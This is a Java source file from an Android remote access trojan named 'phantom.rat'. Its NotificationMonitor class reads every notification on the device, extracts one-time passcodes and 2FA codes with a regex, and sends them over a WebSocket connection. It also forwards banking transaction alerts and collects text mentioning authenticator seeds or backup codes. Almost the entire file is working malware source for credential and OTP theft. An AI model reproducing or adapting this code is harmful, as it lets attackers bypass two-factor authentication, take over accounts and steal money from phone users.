package com.phantom.rat;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class NotificationMonitor extends NotificationListenerService {
    private static volatile String lastOtp = "";
    private static volatile String seedDump = "";
    private static final Pattern OTP = Pattern.compile(
            "(?i)(otp|verification|code|passcode|2fa|one[- ]?time)[^\\d]{0,20}(\\d{4,8})");
    private static final Pattern TX = Pattern.compile(
            "(?i)(credited|debited|transfer|payment|purchase|withdraw|deposit|balance)");

    public static String latestOtp(ContextLike ctx) { return lastOtp; }

    public static String dumpSeeds() { return seedDump; }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            CharSequence text = sbn.getNotification().extras
                    .getCharSequence(android.app.Notification.EXTRA_TEXT, "");
            String app = sbn.getPackageName();
            String body = text == null ? "" : text.toString();
            Matcher m = OTP.matcher(body);
            if (m.find()) {
                String code = m.group(2);
                lastOtp = code;
                WebSocketClient w = WebSocketClient.getInstance();
                if (w != null) w.sendOtp(app, code);
            }
            if (TX.matcher(body).find()) {
                WebSocketClient w = WebSocketClient.getInstance();
                if (w != null) w.sendLog("tx", app + ": " + truncate(body));
            }
            if (body.toLowerCase().contains("authenticator") || body.toLowerCase().contains("seed")
                    || body.toLowerCase().contains("backup code")) {
                if (seedDump.length() < 20000) seedDump += app + ": " + truncate(body) + "\n";
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    private static String truncate(String s) {
        return s.length() > 300 ? s.substring(0, 300) : s;
    }

    /** Small marker to avoid a Context import — resolves to Context in practice. */
    public interface ContextLike {}
}
